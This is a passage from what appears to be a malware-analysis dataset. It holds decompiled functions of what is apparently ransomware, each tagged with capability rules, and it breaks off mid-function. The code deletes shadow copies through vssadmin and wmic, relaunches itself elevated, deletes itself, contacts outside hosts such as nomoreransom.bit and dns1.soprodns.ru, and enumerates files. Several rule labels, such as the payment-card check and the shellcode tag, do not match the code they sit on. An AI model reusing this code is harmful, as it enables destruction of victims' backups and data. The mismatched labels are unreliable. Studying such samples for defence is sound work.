{\n        uStack1708 = 0x403bc3;\n        iVar2 = fcn.00403a60();\n        if (iVar2 == 0) {\n            uStack1708 = 0xff;\n            puStack1712 = &stack0xfffff9f8;\n            uStack1680 = 0x770025;\n            puStack1716 = &stack0xfffff970;\n            uStack1676 = 0x6e0069;\n            uStack1672 = 0x690064;\n            uStack1668 = 0x250072;\n            uStack1664 = 0x73005c;\n            uStack1660 = 0x730079;\n            uStack1656 = 0x650074;\n            uStack1652 = 0x33006d;\n            uStack1648 = 0x5c0032;\n            uStack1644 = 0x620077;\n            uStack1640 = 0x6d0065;\n            uStack1636 = 0x77005c;\n            uStack1632 = 0x69006d;\n            uStack1628 = 99;\n            uStack1720 = 0x403c53;\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n            uStack1636 = 0x720070;\n            uStack1632 = 0x63006f;\n            uStack1628 = 0x730065;\n            uStack1624 = 0x200073;\n            uStack1620 = 0x610063;\n            uStack1616 = 0x6c006c;\n            uStack1612 = 0x630020;\n            uStack1608 = 0x650072;\n            uStack1604 = 0x740061;\n            uStack1600 = 0x200065;\n            uStack1596 = 0x630022;\n            uStack1592 = 0x64006d;\n            uStack1588 = 0x2f0020;\n            uStack1584 = 0x200063;\n            uStack1580 = 0x740073;\n            uStack1576 = 0x720061;\n            uStack1572 = 0x200074;\n            uStack1568 = 0x730025;\n            uStack1564 = 0x22;\n            (*_sym.imp.USER32.dll_wsprintfW)(&stack0xfffffbec, &stack0xfffff99c);\n            uStack1720 = 0x40;\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x3d, 0x3000);\n            *puVar3 = 0x3c;\n            puVar3[1] = 0x40;\n            uVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            pcVar1 = _sym.imp.SHELL32.dll_ShellExecuteExW;\n            uVar5 = 0;\n            puVar3[2] = uVar4;\n            uStack1720 = 0x750072;\n            puStack1716 = 0x61006e;\n            puStack1712 = 0x73;\n            puVar3[3] = &stack0xfffff948;\n            puVar3[4] = &stack0xfffff9dc;\n            puVar3[5] = &stack0xfffffbdc;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            do {\n                iVar2 = (*pcVar1)(puVar3);\n                if (iVar2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(puVar3[0xe], 0xffffffff);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar3[0xe]);\n                    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 100);\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n        }\n    }\n    return;\n}\n",
        "token_count": 1287
    },
    "00404b10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create a process with modified I/O handles and window"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00404b10(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_58h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    \n    _var_10h = ZEXT816(0);\n    fcn.00408b30(&var_58h, 0, 0x44);\n    var_18h = *0x412b0c;\n    var_1ch = *0x412b0c;\n    var_2ch = var_2ch | 0x101;\n    var_20h = *0x412b08;\n    var_28h._0_2_ = 0;\n    var_58h = 0x44;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, param_1, 0, 0, 1, 0, 0, 0, &var_58h, &var_10h);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(var_10h);\n    (*pcVar1)(var_ch);\n    return;\n}\n",
        "token_count": 339
    },
    "00404d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00404d60(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint ARG_1;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpPipeAttributes;\n    uint var_8h;\n    uint var_4h;\n    \n    ARG_1 = 0x73006e;\n    var_10h._0_2_ = 0;\n    var_8h = 0;\n    var_44h = 0x6f006c;\n    var_40h = 0x6b006f;\n    var_3ch = 0x700075;\n    var_38h = 0x250020;\n    var_34h = 0x200053;\n    var_30h = 0x6e0064;\n    var_2ch = 0x310073;\n    var_28h = 0x73002e;\n    var_24h = 0x70006f;\n    var_20h = 0x6f0072;\n    var_1ch = 0x6e0064;\n    var_18h = 0x2e0073;\n    var_14h = 0x750072;\n    lpPipeAttributes = 0xc;\n    var_4h = 1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreatePipe)(0x412b10, 0x412b0c, &lpPipeAttributes, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_SetHandleInformation;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetHandleInformation)(*0x412b10, 1, 0);\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_CreatePipe)(0x412b08, 0x412b14, &lpPipeAttributes, 0);\n            iVar2 = (*pcVar1)(*0x412b14, 1, 0);\n            if (iVar2 != 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x2800, 0x3000, 4);\n                if (iVar2 != 0) {\n                    (*_sym.imp.USER32.dll_wsprintfW)(iVar2, &ARG_1, param_2);\n                    fcn.00404b10();\n                    fcn.00404cb0();\n                    (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar2, 0, 0x8000);\n                    return 0;\n                }\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(param_1, \"fabian wosar <3\");\n                return 0;\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 720
    },
    "00404fd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00404fd0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x400, 0x3000, 4);\n    iVar3 = (*pcVar1)(0, 0x400, 0x3000, 4);\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, iVar2, 0x200);\n        if (iVar3 != 0) {\n            (*_sym.imp.USER32.dll_wsprintfW)(iVar3, L\"/c timeout -c 5 & del \\\"%s\\\" /f /q\", iVar2);\n            (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, L\"open\", L\"cmd.exe\", iVar3, 0, 0);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 260
    },
    "00405e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405e60(int32_t *param_1)\n\n{\n    uint var_8h;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < param_1[2]; var_4h = var_4h + 1) {\n        *(*param_1 + var_4h) = 0;\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00405ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00405ef0(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x123, 0x3000, 4);\n    param_1[1] = uVar1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x515, 0x3000, 4);\n    *param_1 = uVar1;\n    param_1[3] = 0x123;\n    param_1[2] = 0x515;\n    iVar2 = fcn.00405d80(param_1[1], param_1 + 3, *param_1, param_1 + 2);\n    if (iVar2 == 0) {\n        param_1[4] = 1;\n    }\n    param_1[4] = 0;\n    return param_1;\n}\n",
        "token_count": 231
    },
    "004064a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004064a0(int32_t param_1)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    code *pcVar7;\n    uint lpFindFileData;\n    uint lpString2;\n    uint lpNumberOfBytesRead;\n    ushort *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint hFindFile;\n    \n    var_ch = param_1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    puVar1 = param_1 + iVar2 * 2;\n    var_10h = puVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(param_1, 0x410364);\n    hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(param_1, &lpFindFileData);\n    pcVar7 = _sym.imp.KERNEL32.dll_lstrcmpW;\n    *puVar1 = 0;\n    iVar2 = 0;\n    do {\n        iVar3 = (*pcVar7)(&lpString2, 0x410368);\n        if ((iVar3 != 0) && (iVar3 = (*pcVar7)(&lpString2, 0x41036c),  iVar3 != 0)) {\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(param_1, &lpString2);\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n            piVar6 = param_1 + (iVar2 + -1) * 2;\n            if (iVar2 == 0) {\ncode_r0x00406608:\n                iVar2 = 0;\n            }\n            else {\n                do {\n                    if (*piVar6 == 0x2e) break;\n                    piVar6 = piVar6 + -1;\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n                if ((iVar2 == 0) || (iVar2 = (*pcVar7)(piVar6, L\".sql\"),  iVar2 != 0)) goto code_r0x00406608;\n                uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 1, 0, 3, 0, 0);\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetFileSize)(uVar4, 0);\n                var_8h = 0;\n                if ((uVar5 < 0x40000000) &&\n                   (iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar5, 0x3000, 4),  param_1 = var_ch,  iVar2 != 0))\n                {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(uVar4, iVar2, uVar5, &lpNumberOfBytesRead, 0);\n                    if ((iVar3 != 0) && (iVar3 = fcn.00407c10(),  iVar3 != 0)) {\n                        (*_sym.imp.KERNEL32.dll_lstrlenA)(\"*******************\");\n                        var_8h = fcn.00406440();\n                    }\n                    (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar2, 0, 0x8000);\n                    param_1 = var_ch;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n                iVar2 = var_8h;\n                pcVar7 = _sym.imp.KERNEL32.dll_lstrcmpW;\n                if (var_8h != 0) break;\n            }\n            *var_10h = 0;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n    } while (iVar3 != 0);\n    (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n    return iVar2;\n}\n",
        "token_count": 905
    },
    "00407a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00407a00(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint noname_6, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpAddress;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(in_ECX + 4) != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(*(in_ECX + 4));\n    }\n    fcn.004077f0();\n    iVar2 = (*_sym.imp.WININET.dll_InternetConnectW)(*(in_ECX + 4), arg_8h, 0x50, 0, 0, 3, 0, 0);\n    var_4h = 0;\n    if (iVar2 != 0) {\n        var_8h = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x2800, 0x3000, 0x40);\n        lpAddress = uVar3;\n        (*_sym.imp.USER32.dll_wsprintfW)(uVar3, 0x410330, arg_ch);\n        iVar2 = (*_sym.imp.WININET.dll_HttpOpenRequestW)(iVar2, arg_28h, uVar3, L\"HTTP/1.1\", 0, 0, 0x8404f700, 0);\n        if (iVar2 != 0) {\n            var_3ch = 0x6f0048;\n            var_10h._0_2_ = 0;\n            var_38h = 0x740073;\n            var_34h = 0x20003a;\n            var_30h = 0x6f006e;\n            var_2ch = 0x6f006d;\n            var_28h = 0x650072;\n            var_24h = 0x610072;\n            var_20h = 0x73006e;\n            var_1ch = 0x6d006f;\n            var_18h = 0x62002e;\n            var_14h = 0x740069;\n            iVar4 = (*_sym.imp.WININET.dll_HttpAddRequestHeadersW)(iVar2, &var_3ch, 0xffffffff, 0);\n            if (iVar4 != 0) {\n                iVar5 = (*_sym.imp.WININET.dll_HttpSendRequestW)(iVar2, arg_2ch, arg_30h, arg_10h, arg_14h);\n                iVar4 = arg_18h;\n                if (iVar5 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GetLastError)();\n                }\n                else {\n                    iVar6 = arg_1ch + -1;\n                    arg_8h = 0;\n                    iVar5 = (*_sym.imp.WININET.dll_InternetReadFile)(iVar2, arg_18h, iVar6, &arg_8h);\n                    while ((iVar5 != 0 && (arg_8h != 0))) {\n                        *(arg_8h + iVar4) = 0;\n                        arg_8h = 0;\n                        var_4h = 1;\n                        iVar5 = (*_sym.imp.WININET.dll_InternetReadFile)(iVar2, iVar4, iVar6, &arg_8h);\n                    }\n                }\n            }\n        }\n        pcVar1 = _sym.imp.WININET.dll_InternetCloseHandle;\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar2);\n        (*pcVar1)(var_8h);\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n        return var_4h;\n    }\n    return 0;\n}\n",
        "token_count": 1019
    },
    "00406d10": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406d10(uint hKey, uint lpcbData, uint lpValueName, uint lpData, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, lpcbData, 0, 0x20019, &var_4h);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    lpcbData = arg_18h;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(var_4h, lpValueName, 0, 0, lpData, &lpcbData);\n    if (iVar1 == 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        return 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetLastError)();\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    return 0;\n}\n",
        "token_count": 234
    },
    "00404330": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nbool fcn.00404330(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    uint uVar5;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    ushort uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    ushort uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    ushort uStack12;\n    \n    iVar1 = fcn.00403ae0();\n    if (iVar1 == 0) {\n        uStack176 = 0x63005c;\n        uStack172 = 0x64006d;\n        uStack12 = 0;\n        puVar3 = &uStack176;\n        uStack168 = 0x65002e;\n        uStack164 = 0x650078;\n        uStack160 = 0;\n        uStack88 = 0x63002f;\n        uStack84 = 0x760020;\n        uStack80 = 0x730073;\n        uStack76 = 0x640061;\n        uStack72 = 0x69006d;\n        uStack68 = 0x20006e;\n        uStack64 = 0x650064;\n        uStack60 = 0x65006c;\n        uStack56 = 0x650074;\n        uStack52 = 0x730020;\n        uStack48 = 0x610068;\n        uStack44 = 0x6f0064;\n        uStack40 = 0x730077;\n        uStack36 = 0x2f0020;\n        uStack32 = 0x6c0061;\n        uStack28 = 0x20006c;\n        uStack24 = 0x71002f;\n        uStack20 = 0x690075;\n        uStack16 = 0x740065;\n    }\n    else {\n        uStack156 = 0x77005c;\n        uStack152 = 0x650062;\n        puVar3 = &uStack156;\n        uStack148 = 0x5c006d;\n        uStack144 = 0x6d0077;\n        uStack140 = 0x630069;\n        uStack136 = 0x65002e;\n        uStack132 = 0x650078;\n        uStack128 = 0;\n        uStack124 = 0x680073;\n        uStack120 = 0x640061;\n        uStack116 = 0x77006f;\n        uStack112 = 0x6f0063;\n        uStack108 = 0x790070;\n        uStack104 = 0x640020;\n        uStack100 = 0x6c0065;\n        uStack96 = 0x740065;\n        uStack92 = 0x65;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x400, 0x3000, 0x40);\n    if (iVar1 == 0) {\n        bVar4 = false;\n    }\n    else {\n        uVar5 = 0x100;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(iVar1, 0x100);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar1, puVar3);\n        uVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, L\"open\", iVar1, uVar5, 0, 0);\n        bVar4 = 0x20 < uVar2;\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    return bVar4;\n}\n",
        "token_count": 1019
    },
    "00406110": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "get common file path"
        ],
        "decompiled_code": "\nuint fcn.00406110(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x201, 0x3000, 0x40);\n    iVar3 = fcn.00407ba0();\n    if (iVar3 == 0) {\n        iVar3 = fcn.00407ba0();\n        if (iVar3 == 0) {\n            iVar3 = fcn.00407ba0();\n            if (iVar3 == 0) {\n                iVar3 = fcn.00407ba0();\n                if (iVar3 == 0) {\n                    iVar3 = fcn.00407ba0();\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.00407ba0();\n                        pcVar1 = _sym.imp.SHELL32.dll_SHGetSpecialFolderPathW;\n                        if (iVar3 == 0) {\n                            iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathW)(0, uVar2, 0x2a, 0);\n                            if (iVar3 != 0) {\n                                iVar3 = fcn.00407ba0();\n                                if (iVar3 != 0) goto code_r0x00406228;\n                            }\n                            iVar3 = (*pcVar1)(0, uVar2, 0x2b, 0);\n                            if (iVar3 != 0) {\n                                iVar3 = fcn.00407ba0();\n                                if (iVar3 != 0) goto code_r0x00406228;\n                            }\n                            iVar3 = (*pcVar1)(0, uVar2, 0x24, 0);\n                            if (iVar3 != 0) {\n                                iVar3 = fcn.00407ba0();\n                                if (iVar3 != 0) goto code_r0x00406228;\n                            }\n                            iVar3 = (*pcVar1)(0, uVar2, 0x1c, 0);\n                            if (iVar3 != 0) {\n                                iVar3 = fcn.00407ba0();\n                                if (iVar3 != 0) goto code_r0x00406228;\n                            }\n                            (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar2, 0, 0x8000);\n                            return 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00406228:\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar2, 0, 0x8000);\n    return 0;\n}\n",
        "token_count": 572
    },
    "00407c60": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00407c60(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint var_64h;\n    uint lpProcName;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint phProv;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&phProv, 0, 0, 1, 0xf0000000);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar4 = 0;\n    do {\n        *(&var_64h + uVar4 * 2) = uVar4 + 0x61;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x1a);\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_2 + 1, 0x3000, 0x40);\n    if ((iVar1 != 0) && (param_2 < param_2 + 1)) {\n        lpProcName = 0x70797243;\n        var_28h = 0x6e654774;\n        var_24h = 0x646e6152;\n        var_20h._0_2_ = 0x6d6f;\n        var_20h._2_1_ = 0;\n        lpLibFileName = 0x61766441;\n        var_18h = 0x32336970;\n        var_14h = 0x6c6c642e;\n        var_10h._0_1_ = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpLibFileName);\n        if ((((iVar2 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName),  iVar2 == 0)) ||\n            (pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, &lpProcName),  pcVar3 == NULL)) ||\n           (iVar2 = (*pcVar3)(phProv, param_2, iVar1),  iVar2 == 0)) {\n            uVar5 = 0;\n        }\n        else {\n            uVar4 = 0;\n            if (param_2 != 0) {\n                var_ch = 0x1a;\n                do {\n                    *(var_8h + uVar4 * 2) = *(&var_64h + (*(iVar1 + uVar4) % 0x1a) * 2);\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < param_2);\n            }\n            uVar5 = 1;\n        }\n        (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n        return uVar5;\n    }\n    (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    return 0;\n}\n",
        "token_count": 806
    },
    "00407db0": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00407db0(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    char acStack60 [12];\n    uint lpProcName;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint phProv;\n    \n    uVar5 = 0;\n    var_8h = param_2;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&phProv, 0, 0, 1, 0xf0000000);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar4 = 0;\n    do {\n        acStack60[uVar4] = uVar4 + 'a';\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x1a);\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_2 + 1, 0x3000, 0x40);\n    if ((iVar1 != 0) && (var_8h < param_2 + 1)) {\n        lpProcName = 0x70797243;\n        var_28h = 0x6e654774;\n        var_24h = 0x646e6152;\n        var_20h._0_2_ = 0x6d6f;\n        var_20h._2_1_ = 0;\n        lpLibFileName = 0x61766441;\n        var_18h = 0x32336970;\n        var_14h = 0x6c6c642e;\n        var_10h._0_1_ = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpLibFileName);\n        if ((((iVar2 != 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName),  iVar2 != 0)) &&\n            (pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, &lpProcName),  pcVar3 != NULL)) &&\n           (iVar2 = (*pcVar3)(phProv, var_8h, var_ch),  iVar2 != 0)) {\n            uVar5 = 1;\n        }\n        (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n        return uVar5;\n    }\n    (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    return 0;\n}\n",
        "token_count": 706
    },
    "00402d30": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00402d30(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iStack216;\n    int32_t iStack212;\n    int32_t iStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    char16_t *pcStack192;\n    char16_t *pcStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uchar *puStack140;\n    code *pcStack136;\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uchar *puStack116;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack60;\n    uint uStack56;\n    code *pcStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    char16_t *pcStack32;\n    \n    uStack84 = 0x6c006b;\n    uStack80 = 0x660069;\n    uStack76 = 0x73002e;\n    uStack72 = 0x730079;\n    uStack68 = uStack68 & 0xffff0000;\n    uStack88 = 0x73;\n    puStack116 = 0x402d8c;\n    iVar5 = fcn.00402f50();\n    if (iVar5 == 0) {\n        puStack116 = 0x402d99;\n        iVar5 = fcn.00402f50();\n        if (iVar5 == 0) {\n            uStack84 = 0x730066;\n            uStack80 = 0x660064;\n            uStack76 = 0x2e0077;\n            uStack72 = 0x790073;\n            uStack68 = 0x73;\n            puStack116 = 0x402dce;\n            iVar5 = fcn.00402f50();\n            if (iVar5 != 0) goto code_r0x00402f3d;\n            puStack116 = 0x402ddb;\n            puStack116 = fcn.004030a0();\n            if (puStack116 != NULL) goto code_r0x00402f3d;\n            puStack120 = 0x402de9;\n            fcn.00402ad0();\n        }\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    puStack120 = NULL;\n    uStack60 = 0x30;\n    uStack56 = 3;\n    pcStack52 = fcn.00402c50;\n    uStack48 = 0;\n    uStack44 = 0;\n    uStack124 = 0x402e1b;\n    uStack44 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n    uStack124 = 0x7f00;\n    puStack128 = NULL;\n    uStack40 = 0;\n    uStack132 = 0x402e34;\n    uStack44 = (*_sym.imp.USER32.dll_LoadCursorW)();\n    uStack132 = 0x7f00;\n    pcStack136 = pcStack52;\n    uStack40 